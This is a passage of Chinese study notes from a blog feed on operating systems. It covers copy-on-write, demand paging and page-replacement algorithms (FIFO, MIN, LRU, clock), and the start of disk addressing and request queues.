<p>继续扩展：<code>子进程执行*p=8,而后print(p)</code></p>
</blockquote>
</blockquote>
<p>这一步<strong>有所不同</strong>，当然程序执行流程还是那样：先通过p获取到其<strong>物理地址</strong>，这一步和上一个代码一样，但是在获取后<strong>不会直接进行赋值</strong>。因为<strong>子进程对p的物理页框的权限为只读</strong>，所以无法进行赋值。这时就会出现<code>异常中断</code>，此中断会为子进程<strong>分配一个新的内存页框并修改页表完成映射</strong>。这样程序就会将8赋值为这个新的页框了。</p>
<p>程序执行的<strong>内存视图</strong>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660705083067.png"></p>
<hr>
<hr>
<blockquote>
<p><strong>写在最后</strong></p>
<blockquote>
<p><strong>总结</strong>：这一篇博客完成了操作系统中<strong>内存管理</strong>的学习。通过回顾整理的内容，发现内存管理部分就<strong>两个部分</strong>：<code>内存空间的分配</code>、<code>内存中程序的执行</code>。其中内存空间的分配为了兼顾用户和计算机需求，采取<strong>段页结合的机制</strong>，通过<strong>虚拟内存</strong>作为中转实现逻辑地址和物理地址的转换。而<strong>程序执行</strong>的关键在于<strong>地址翻译也就是重定位</strong>，这一步是由<strong>MMU自动实现</strong>的，但是具体到底层还是<strong>LDT表和页目录、页表的查询</strong>，因此理解这两个表尤为重要。<br><strong>下一步计划</strong>：进行<strong>磁盘、文件系统</strong>的学习，如何将磁盘文件放到内存中；同时<strong>完成内存管理的实验</strong>，通过实际修改代码实现对内存管理的深入理解。</p>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>（第六节）操作系统--换入&#92;换出（用空间和时间换虚存）</title>
    <url>/2022/09/12/%EF%BC%88%E7%AC%AC%E5%85%AD%E8%8A%82%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E6%8D%A2%E5%85%A5_%E6%8D%A2%E5%87%BA%EF%BC%88%E7%94%A8%E7%A9%BA%E9%97%B4%E5%92%8C%E6%97%B6%E9%97%B4%E6%8D%A2%E8%99%9A%E5%AD%98%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong></p>
<blockquote>
<p>前面在<strong>内存管理部分</strong>我们介绍了<strong>地址翻译</strong>的相关知识，即通过<strong>段基址和偏移</strong>获取<strong>虚拟地址</strong>，而后通过虚拟地址获取到<strong>物理地址</strong>。<code>虚拟内存</code>作为<strong>中转区域</strong>完成<strong>段页结合机制</strong>，同时<strong>32位逻辑地址</strong>可以定位到一个<strong>4G大小的区域</strong>，而这也是<strong>虚拟内存的标准大小</strong>，换句话说，<strong>每一个进程都对应一个虚拟内存且其大小为4G</strong>。<br>但是虚拟内存毕竟是虚拟的，只有将其<strong>与物理页框映射</strong>才可以落实到具体的硬件存储中。这就<strong>导致一个问题</strong>：<code>虚拟内存太大了而实际物理内存太小</code>，使得物理内存无法与所有的虚拟内存完成映射。因此，采取<strong>换入、换出机制</strong>，<code>使用磁盘和时间换取空间</code>。</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p><code>换入</code>：<strong>用户在访问某个虚拟内存时，如果此虚拟内存没有与物理内存关联，就立马从磁盘上读取内容并建立关联</strong>。<br><code>换出</code>：<strong>将物理内存上的部分内容移到磁盘中并和虚拟内存解除关联。</strong></p>
</blockquote>
</blockquote>
<p><strong>注</strong>：<a href="https://book.douban.com/subject/30391722/">文章内容参考《操作系统原理 实现、与实践》</a>，所用图片来自<strong>书配图与网络</strong>，仅用于<strong>个人学习</strong>使用。</p>
<h1 id="规整的虚拟内存"><a href="#规整的虚拟内存" class="headerlink" title="规整的虚拟内存"></a>规整的虚拟内存</h1><h2 id="基本概念介绍"><a href="#基本概念介绍" class="headerlink" title="基本概念介绍"></a>基本概念介绍</h2><blockquote>
<p>什么叫规整？</p>
</blockquote>
<p><code>规整</code>是一个<strong>形容词</strong>，在这里是说<strong>每一个进程对应的虚拟内存都有相同的大小</strong>（<strong>32位操作系统</strong>定义的虚拟内存大小为<code>4G</code>)</p>
<p>建立规整的虚拟内存可以<strong>简化用户程序对内存的使用</strong>。</p>
<blockquote>
<p>如何实现规整？</p>
</blockquote>
<p>通过<code>换入、换出机制</code>。对于此机制的<strong>定义上面已经給出</strong>，我们下面要介绍这种<strong>机制的原理</strong>及<strong>如何实现</strong>这种机制。不过，在此之前先来看一下<strong>换入换出的示意图</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660920916239.png"></p>
<h1 id="换入机制-请求调页"><a href="#换入机制-请求调页" class="headerlink" title="换入机制-请求调页"></a>换入机制-请求调页</h1><h2 id="请求调页"><a href="#请求调页" class="headerlink" title="请求调页"></a>请求调页</h2><blockquote>
<p>换入的前提：<strong>映射未建立</strong></p>
</blockquote>
<p>我们以<strong>下图为例</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660982682804.png"></p>
<p>通过<strong>段基址+段内偏移</strong>得到<strong>虚拟地址</strong>为0x4040。而后就要将这个虚拟地址<strong>转换为实际物理地址</strong>，通过运算可得此虚拟地址对应的<strong>页号为4</strong>，所以<strong>查询页表</strong>得到物理地址。这时<strong>问题就出现了</strong>，<strong>页表中并没有建立映射关系</strong>，也就无法获取物理页。</p>
<p>这时，就要使用<strong>换入机制</strong>，即在缺少虚拟页时<code>请求调页</code>。</p>
<blockquote>
<p>内存换入：请求调页</p>
</blockquote>
<p>请求调页的过程发生在：<strong>MMU发现虚拟页面在页表项中有效位为0时</strong>。调页的<strong>流程</strong>大概如下：</p>
<ol>
<li>MMU向CPU发送<strong>缺页中断</strong>，而后执行这个中断程序。</li>
<li><strong>中断程序</strong>首先会先在<strong>磁盘</strong>中找到这个虚拟页面对应的内容，并将其放到一个<strong>空闲页框</strong>中。</li>
<li><strong>修改页表</strong>项，完成虚拟内存与物理页框的<strong>映射处理</strong>。</li>
</ol>
<p>下图是对<strong>请求调页</strong>的<strong>流程概括</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660983387026.png"></p>
<h2 id="页面调入的具体实现"><a href="#页面调入的具体实现" class="headerlink" title="页面调入的具体实现"></a>页面调入的具体实现</h2><blockquote>
<p>前面我们只是介绍了<strong>请求调页的流程</strong>，下面要学习其<strong>具体实现</strong>，会从<strong>代码的层面</strong>进行介绍。</p>
</blockquote>
<blockquote>
<p>代码1：从<strong>缺页中断程序</strong>开始</p>
</blockquote>
<p>我们要分析此系统如何实现<strong>换入机制</strong>，肯定要从<strong>第一句代码开始</strong>，这个代码就是<strong>缺页中断的代码</strong>。<br>在操作系统启动时<strong>初始IDT表</strong>时就将<strong>14号中断</strong>设置为<strong>缺页中断</strong>，具体如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660992557858.png"></p>
<p>如上图所示，<code>page_fault</code>就是对应的<strong>中断处理函数</strong>，其具体代码如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660992671454.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660992682588.png"></p>
<p>我们来<strong>分析一下代码</strong>：</p>
<ul>
<li>第一行：获取<strong>页面错误的类型</strong>，是<code>缺页</code>还是<code>越权访问</code>，并把结果<strong>保存在eax</strong>里。</li>
<li>第二行：将edx的值保存在<code>cr2寄存器</code>，用于<strong>确定缺页的虚拟地址</strong>。</li>
<li>第三、四行：将<strong>参数压栈</strong>，为后续函数<strong>传参</strong>。</li>
<li>第五行：判断错误类型，并<strong>跳转到对应函数</strong>，包括<code>do_no_page</code>和<code>do_wp_page</code></li>
<li>后续就是函数的<strong>跳转与执行</strong></li>
</ul>
<blockquote>
<p><code>do_no_page</code><strong>函数</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660997689877.png"></p>
<p><strong>分析一下代码</strong>：</p>
<ul>
<li>第一行：通过<strong>与运算</strong>得出<strong>虚拟页号</strong>（<code>前20位</code>）</li>
<li>第二行：通过<code>get_free_page()</code>获取一个<strong>空闲的物理内存</strong></li>
<li>第三行：通过<code>bread_page()</code>将<strong>磁盘内容</strong>放入物理内存中</li>
<li>第四行：通过<code>put_page()</code>填写<strong>页表内容</strong>，完成映射</li>
</ul>
<p>需要注意的是，<code>bread_page</code>完成<strong>磁盘读写</strong>的实现我们放到后面<strong>文件管理</strong>时具体介绍。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong></p>
<blockquote>
<p>上面我们介绍了<strong>内存换入</strong>的原因与实现，过程很简单：<code>缺页中断</code>-&gt;<code>虚拟页号获取</code>-&gt;<code>物理内存获取与磁盘写入</code>-&gt;<code>页表填写完成映射</code>。到这里，主程序就可以<strong>寻址成功</strong>。<br>不只有换入，还有<code>换出</code>，因为我们在换入时会<strong>请求一个物理内存</strong>，但是我们<strong>无法保证</strong>一定有<strong>空闲的物理内存</strong>，一旦没有就要实施<strong>换出机制</strong>。换出的流程与实现要<strong>复杂一点</strong>，涉及到<strong>很多算法</strong>。</p>
</blockquote>
</blockquote>
<h1 id="换入机制-页面换出"><a href="#换入机制-页面换出" class="headerlink" title="换入机制-页面换出"></a>换入机制-页面换出</h1><h2 id="页面换出的基本算法"><a href="#页面换出的基本算法" class="headerlink" title="页面换出的基本算法"></a>页面换出的基本算法</h2><p>页面换出是在<code>get_free_page</code>时实现的，而页面换出的一个<strong>很重要的问题</strong>就是：<code>如何确定要淘汰哪一页？</code></p>
<p>我们需要<strong>一些算法</strong>来确定<strong>换出机制的淘汰对象</strong>，这里我们主要介绍<strong>以下三种算法</strong>：（比较其<strong>优缺点</strong>，找到最优算法）</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661004486763.png"></p>
<blockquote>
<p>算法1：<strong>FIFO（先入先出）</strong></p>
</blockquote>
<p>我们以下面<strong>这个例子</strong>来看：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661004557326.png"></p>
<p>如图所示，使用<strong>FIFO算法</strong>进行页面<strong>换出和换入</strong>，缺页次数为7。这种算法<strong>并不是很好</strong>，因为往往导致<strong>刚刚换出的页又要被换入</strong>。</p>
<blockquote>
<p>算法2：MIN（取最后一个使用的进行换出）</p>
</blockquote>
<p>使用<strong>MIN算</strong>法实际操作我们上面的例子：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661004727541.png"></p>
<p><strong>缺页次数变少了</strong>。其实，M<code>IN算法</code>就是<strong>最优的换出算法</strong>，可以有效减少缺页次数。</p>
<p>但是，<code>MIN算法</code>只是一种<strong>理想算法</strong>，在实际的情况下，我们<strong>不可能知道后面要发生什么</strong>，也就<strong>无法确定</strong>后续哪一个页最后被使用。</p>
<p>但但是，我们可以<strong>借鉴一下MIN算法的思想</strong>，从而引出<code>LRU算法</code>。</p>
<blockquote>
<p>算法3：LRU算法</p>
</blockquote>
<p>使用<strong>LRU算法</strong>的示例：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661004922250.png"></p>
<p><code>LRU算法</code>就是使用<strong>历史来预测未来</strong>：根据<code>局部性规律</code>，我们的程序往往在<strong>一个固定的段中</strong>进行跳转，比如：<strong>while循环、for循环等</strong>操作。</p>
<p>所以<strong>如图所示</strong>，通过<strong>LRU算法</strong>得到的换出顺序与<strong>MIN算法</strong>一致，可以达到<strong>最优策略</strong>。</p>
<h2 id="LRU算法的具体实现"><a href="#LRU算法的具体实现" class="headerlink" title="LRU算法的具体实现"></a>LRU算法的具体实现</h2><blockquote>
<p>实现方法1：<code>时间戳</code>（<strong>模拟很简单，实践不适用</strong>）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661040812498.png"></p>
<p>如图所示，我们<strong>维护一个表</strong>，在其中为<strong>每一个页定义一个时间戳</strong>，这个时间戳会随着页的使用而<strong>依次增加</strong>，换出时选择<strong>时间戳最小的页</strong>所在的页框进行换出。</p>
<p>使用<strong>时间戳</strong>的方法看起来很直观，也很好实现，但是在<strong>实际情况下很难落实</strong>：<code>花费时间较多、时间戳溢出</code>等</p>
<blockquote>
<p>实现方法2：<code>页码栈</code>（<strong>频繁修改指针，代价较大</strong>）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661040882305.png"></p>
<p>如图所示，维护一个<strong>页码栈</strong>，将<strong>最近使用</strong>的页放到最上面（<strong>浮起来</strong>），换出时选择<strong>沉底的页</strong>所在的页框。</p>
<p>使用<strong>页码栈</strong>会导致每次地址访问都要<strong>修改指针</strong>，时间代价较大。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong></p>
<blockquote>
<p>前面我们引出了<code>LRU算法</code>，并给出了几种实现方法：<strong>时间戳、页码栈</strong>等，但是在实际情况下都很难高效实现。<br>所以我们要对LRU算法进行进一步改进：使用<code>LRU的近似实现</code></p>
</blockquote>
</blockquote>
<h2 id="clock算法"><a href="#clock算法" class="headerlink" title="clock算法"></a>clock算法</h2><blockquote>
<p><code>clock算法</code>就是对<strong>LRU算法的近似实现</strong>，将时间计数改为了<strong>是和否</strong>，而不是使用递增数字。<code>使用最近没有使用近似最少使用。</code></p>
</blockquote>
<blockquote>
<blockquote>
<p><code>原始clock算法</code>实现（<strong>单指针</strong>）</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661040991247.png"></p>
<p>如图所示，每一个页加一个<code>引用位</code>，每一次访问此页时就将该位<strong>置为1</strong>；而后在<strong>缺页而选择淘汰页</strong>时，将该位为1的页<strong>置0</strong>，该位为0页淘汰。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661041451429.png"></p>
<p><strong>注</strong>：图中的每一个框框都是分配给此进程的<strong>物理页框</strong>。</p>
<p>这种方法可以很好的<strong>节省资源</strong>，因为我们可以将页的引用位放到<strong>页码表</strong>里，当<code>MMU</code>进行查询时<strong>自动执行</strong>置0操作，而不需要像前面那样维护一个复杂的数据结构。</p>
<blockquote>
<blockquote>
<p>clock算法的<strong>分析与改进</strong>（<strong>双指针</strong>）</p>
</blockquote>
</blockquote>
<p><strong>原始clock算法</strong>虽然可以节省很多资源、很高效，但是其<strong>对LRU的近似并不好</strong>。 </p>
<p>我们看<strong>下面这个例子</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661041084059.png"></p>
<p>因为现在的计算机<strong>内存都比较大</strong>，缺页的情况发生的很少，所以会导致所有页的<strong>引用位被置1</strong>；而后在<strong>缺页时</strong>选择淘汰页时，会把所有的页的<strong>引用位都归零</strong>，并选取其中一个进行调出；这样就会导致clock算法<strong>退化为FIFO算法</strong>。</p>
<p><strong>问题所在</strong>：记录的<strong>历史信息太长</strong>，导致“<code>最近没有使用近似最少使用</code>”中的<strong>最近</strong>没有体现出来</p>
<p><strong>问题解决</strong>：<code>定时清除R位</code>。使用<strong>双指针</strong>的方式进行，<strong>快指针用于清除</strong>，<strong>慢指针用于选择淘汰页</strong>。</p>
<h2 id="页框个数分配和全局置换"><a href="#页框个数分配和全局置换" class="headerlink" title="页框个数分配和全局置换"></a>页框个数分配和全局置换</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661041193986.png"></p>
<p>如图所示，给每一个<strong>进程分配的页框数目</strong>是一个很需要考虑的问题：<strong>分配的多会使得换入、换出机制的失效</strong>，分配的少会导致<strong>颠簸现象</strong>（<code>本质还是缺页</code>）</p>
<p>分配页框的个数也有<strong>很多算法</strong>来计算，一般思想是：<strong>计算一个工作集，使其可以覆盖局部</strong>。这里我们<strong>不再介绍</strong>。</p>
<hr>
<hr>
<blockquote>
<p><strong>写在最后</strong>：<strong>总结</strong></p>
<blockquote>
<p>这一节我们介绍了一个<strong>规整的虚拟内存</strong>的实现：通过<strong>换入、换出机制</strong>保证每一个进程都有一个固定大小的虚拟内存空间。同时介绍了换入换出机制的<strong>原理和实现</strong>，其中涉及到<strong>很多算法</strong>以提高换入、换出的效率。<br>到这里，操作系统中的核心视图——<code>多进程视图</code>就学习完毕了。后面我们将进行<code>IO设备驱动</code>、<code>文件管理</code>等的介绍与学习。</p>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>（第八节）操作系统--磁盘管理和文件系统</title>
    <url>/2022/08/24/%EF%BC%88%E7%AC%AC%E5%85%AB%E8%8A%82%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：</p>
<blockquote>
<p>在<strong>上一节</strong>我们学习了两个简单的<strong>IO设备驱动管理</strong>–<strong>显示器</strong>和<strong>键盘</strong>，通过对这两个设备的学习，我们理清了<code>printf</code>和<code>scanf</code>的实现流程，同时也看到了<code>文件视图</code>在操作系统中的作用。<br>在<strong>本节中</strong>，我们将<strong>更加深入</strong>的学习这个操作系统的<strong>第二个核心视图</strong>–<code>文件视图</code>。我们将<strong>从磁盘出发</strong>，层层递进，完成<code>五层抽象机制</code>，最终实现整个<strong>文件系统的构建</strong>。</p>
</blockquote>
</blockquote>
<h1 id="磁盘工作的基本原理"><a href="#磁盘工作的基本原理" class="headerlink" title="磁盘工作的基本原理"></a>磁盘工作的基本原理</h1><h2 id="磁盘工作的原理"><a href="#磁盘工作的原理" class="headerlink" title="磁盘工作的原理"></a>磁盘工作的原理</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661240967077.png"></p>
<p>磁盘的<strong>工作原理</strong>与上一节中介绍的<strong>显示器、键盘</strong>一致，都是包含<code>两条主线</code>：</p>
<ol>
<li><code>使用磁盘</code>：CPU<strong>发送命令</strong>给磁盘设备，最终落到“<code>out ax，端口号</code>”</li>
<li><code>磁盘中断</code>：即磁盘完成工作后告诉CPU，CPU在<strong>中断处理中</strong>完成后续工作，比如<strong>将磁盘读入的内容放到内存buf</strong>等。</li>
</ol>
<h2 id="磁盘工作的过程"><a href="#磁盘工作的过程" class="headerlink" title="磁盘工作的过程"></a>磁盘工作的过程</h2><blockquote>
<p>磁盘的<strong>基本构造</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661241266528.png"></p>
<p>如图所示，一个<strong>磁盘由多个盘面组成</strong>，也就是图中的一层层的圆盘；而<strong>一个盘面</strong>又可以分为<strong>多个半径不同</strong>的<strong>同心环</strong>，这些同心环被称为<code>磁道</code>；每一个磁道又可以分为多个<code>扇区</code>，这是磁盘<strong>读写的基本单位</strong>。同时<strong>不同盘面的同一个磁道</strong>形成<code>柱面</code>。</p>
<blockquote>
<p>磁盘读写的<strong>具体过程</strong></p>
</blockquote>
<p>如上图所示，在磁盘中有一个装置叫做<code>磁头</code>，<strong>每一个盘面</strong>都会有一个磁头，并且<strong>不同盘面</strong>的磁头是<strong>绑定在一起</strong>的，也就是说<strong>不同的磁头会对应不同盘面的同一个相对位置</strong>。而后将对应<strong>磁头上电</strong>即可进行<strong>扇区的选择</strong>和<strong>后续读写</strong>。具体的步骤可以分为以下几步：</p>
<ol>
<li><code>柱面C</code>的选择：通过<strong>控制磁头的移动</strong>选择对应的柱面。</li>
<li><code>磁道</code>的选择：本质是磁头的选择，将<strong>对应磁道上的磁头上电</strong>即可</li>
<li><code>扇区</code>的选择：选择完磁道后，即可<strong>旋转盘面</strong>将需要的扇区S转到<strong>上电磁头下方</strong></li>
<li>完成<code>读写</code>：<strong>在磁盘扇区</strong>和<strong>内存缓存</strong>之间进行。</li>
</ol>
<h2 id="使用磁盘的直观方法"><a href="#使用磁盘的直观方法" class="headerlink" title="使用磁盘的直观方法"></a>使用磁盘的直观方法</h2><p>通过上文对<strong>磁盘工作原理和工作流程</strong>的介绍，我们可以得出<strong>使用磁盘完成读写的直观方法</strong>：CPU告知磁盘要读写的<strong>柱面C</strong>、<strong>磁头H</strong>、<strong>扇区S</strong>以及内存<strong>缓存位置</strong>和<strong>读写长度</strong>即可。当然在传入命令之前还需要<strong>获取这些信息的端口地址</strong>。</p>
<p>具体的<strong>实现代码</strong>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661242567760.png"></p>
<p>如上图代码所示，实现代码主要包含<strong>两个函数</strong>，<code>hd_out</code>用于<strong>将信息传入对应端口</strong>，<code>port_write</code>完成<strong>数据交换</strong>。</p>
<p>其中对于<code>hd_out函数</code>的<strong>参数</strong>我们需要知道：</p>
<ul>
<li><code>drive</code>:为驱动器信息</li>
<li><code>nsect</code>:为读写长度信息</li>
<li><code>sec</code>:为扇区信息</li>
<li><code>head</code>:为磁头信息 </li>
<li><code>cyl</code>:为柱面信息</li>
<li><code>cmd</code>:为读写类型信息</li>
</ul>
<p>通过将这些信息放到<strong>控制器</strong>对应的位置即可完成后续的<strong>数据交换</strong>。</p>
<p><strong>注</strong>：<strong>磁盘与内存</strong>之间进行<strong>数据交换</strong>是通过<code>磁头</code>进行的。磁头上电，<strong>读磁盘</strong>就是<code>磁信号转换为电信号</code>；<strong>写磁盘</strong>就是<code>电信号转换为磁信号</code>。数据的传输还是通过<strong>总线</strong>。</p>
<h1 id="生磁盘的使用"><a href="#生磁盘的使用" class="headerlink" title="生磁盘的使用"></a>生磁盘的使用</h1><h2 id="第一层抽象：从扇区到磁盘块的请求"><a href="#第一层抽象：从扇区到磁盘块的请求" class="headerlink" title="第一层抽象：从扇区到磁盘块的请求"></a>第一层抽象：从扇区到磁盘块的请求</h2><blockquote>
<p>问题引入：CHS机制的<strong>复杂性</strong></p>
</blockquote>
<p>前面我们介绍了<strong>磁盘读写的流程</strong>：通过给定<code>C、H、S</code>定位到<strong>确定的扇区</strong>，而后进行<strong>数据交换</strong>。但是，对于上层用户来说要想准确定位到一个扇区，需要<strong>对磁盘的结构了解</strong>，还要知道这个<strong>磁盘有多少柱面、多少磁头、多少扇区</strong>等，这对于用户来说太复杂了。</p>
<p>所以，有必要引入<strong>新的机制</strong>来简化用户对于磁盘读写的操作，采取的方法就是——<code>编址方案</code>。</p>
<blockquote>
<p>问题解决：<strong>新的编址方案</strong></p>
</blockquote>
<p>新的编址方案就是<strong>将CHS寻址与扇区号建立一个映射</strong>，换句话说，就是给每一个<strong>扇区编号</strong>，用户直接调用扇区号即可访问，<code>CHS地址</code>的转换由<strong>操作系统自动完成</strong>。</p>
<blockquote>
<blockquote>
<p>扇区编号<strong>方案选取</strong></p>
</blockquote>
</blockquote>
<p>既然要给<strong>扇区编号</strong>，就要有<strong>一定的规范</strong>，接下来我们就来介绍一下<strong>这个规范</strong>：</p>
<p>首先<strong>确定0号扇区的位置</strong>，一般是<code>0柱面</code>（最外面的柱面）、<code>0磁道</code>（最上面的磁道）、<code>0扇区</code>（磁盘旋转整圈以后的扇区）为<code>0号扇区</code>，之后将与此扇区同一个磁道上的扇区<strong>依次进行命名</strong>。如下图所示：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661253194634.png"></p>
<blockquote>
<blockquote>
<p>采取这种<strong>编号方案的原因</strong></p>
</blockquote>
</blockquote>
<p>为什么要按照上图的<code>方案1</code> 来编号呢，其他几个方案<strong>为什么不行</strong>？</p>
<p><strong>答案</strong>很简单，因为第一个方案可以<strong>提高磁盘读写的速度</strong>。<br>至于为什么与其他方案相比第一种方案读写较快，一个很重要的原因就是第一种方案在读写连续扇区时<strong>不需要进行磁道的切换</strong>。（与<code>旋转磁盘、数据传输</code>相比，<code>磁道切换</code>花费的<strong>时间最多</strong>）</p>
<p><strong>注</strong>：<code>磁盘访问时间</code>&#x3D;<code>写入控制器时间</code>+<code>寻道时间(即柱面的选择，大约10ms)</code>+<code>旋转时间(即磁头在磁道上旋转，半周大概4ms)</code>+<code>传输时间（磁、电信号转换，大约0.3ms)</code></p>
<blockquote>
<blockquote>
<p>编址后<strong>地址的换算</strong></p>
</blockquote>
</blockquote>
<p>通过第一种方案为<strong>扇区编号</strong>，可以得到<code>编址结构</code>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661253578452.png"></p>
<p>当然，无论是采取<strong>哪一种编址方案</strong>，最终都要落实到<code>CHS地址</code>上。按照第一种方案可以得到<strong>扇区号和CHS扇区</strong>地址的<strong>计算公式</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661253654252.png"></p>
<p>根据<strong>上述公式</strong>可以推出<strong>由扇区号到CHS地址的计算方法</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661253840207.png"></p>
<hr>
<p>到这里，就完成了<strong>CSH到扇区号</strong>的<strong>完整映射</strong>，用户只需要给出<strong>扇区号</strong>，操作系统就可以根据上公式<strong>自动换算</strong>出其具体地址，而后由<code>out指令</code>将参数信息传入<strong>磁盘控制器</strong>最终实现磁盘读写。</p>
<p>但是，磁盘的第一层抽象<strong>不仅仅</strong>只有编址方案，还有：<code>从扇区到磁盘块的抽象</code></p>
<blockquote>
<p><strong>从扇区到磁盘块</strong>的抽象</p>
</blockquote>
<p>因为磁盘进行<code>数据交换</code>花费的时间相比于<code>磁道切换</code>、<code>磁盘旋转</code>花费的时间可以<strong>忽略不计</strong>，所以将<strong>多个扇区</strong>抽象为<strong>一个磁盘块</strong>可以显著<strong>提高读写速度</strong>（不要每一个扇区读写完毕后都要进行磁盘旋转了）。</p>
<p><strong>磁盘块的抽象</strong>是<code>以空间换时间</code>，但是现在<strong>磁盘越来越大</strong>而读写花费时间上却<strong>没有太大的进步</strong>，所以这种交换是值得的。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661266276903.png" alt=" =200x100"></p>
<p>所以，使用<strong>盘块号取代扇区号</strong>，其换算关系如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661254342724.png"></p>
<p>其中<code>blocksize</code>为<strong>磁盘块的大小</strong>即所含<strong>扇区的个数</strong>。一般来说，<strong>磁盘块越大</strong>则读写的<strong>效率越高</strong>，但是对空间的<strong>浪费也就越大</strong>。</p>
<p>不论如何抽象，最终还是要<strong>转换为CHS地址</strong>才可以<strong>真正完成</strong>磁盘读写。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong></p>
<blockquote>
<p>前面我们介绍了<strong>磁盘读写的第一层抽象</strong>：<code>扇区到磁盘块的抽象</code>。用户只需要提供<strong>盘块号</strong>就可以完成扇区号、CHS地址的计算，进而准确定位到一个<strong>具体的扇区</strong>并完成<strong>读写操作</strong>请求。<br>但是，在实际操作系统中往往是<strong>多个进程产出多个磁盘块请求</strong>的情况，所以就要使用<strong>一个队列</strong>来管理这些请求，这就是磁盘管理的<strong>第二层抽象</strong>。</p>
</blockquote>
</blockquote>
<h2 id="第二层抽象：多个进程产生的磁盘请求队列"><a href="#第二层抽象：多个进程产生的磁盘请求队列" class="headerlink" title="第二层抽象：多个进程产生的磁盘请求队列"></a>第二层抽象：多个进程产生的磁盘请求队列</h2><blockquote>
<p>抽象的实现与后续执行步骤</p>
</blockquote>
<p><strong>多个进程</strong>请求磁盘读写，使用<strong>请求队列</strong>来控制进行的请求。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1661266805033.png"></p>
<p>其实问题的<strong>关键</strong>不在于请求队列的建立，而在于<strong>如何从队列中选择下一个要执行的请求</strong>。这要综合考虑，使得<code>平均访问延迟</code>最小。</p>
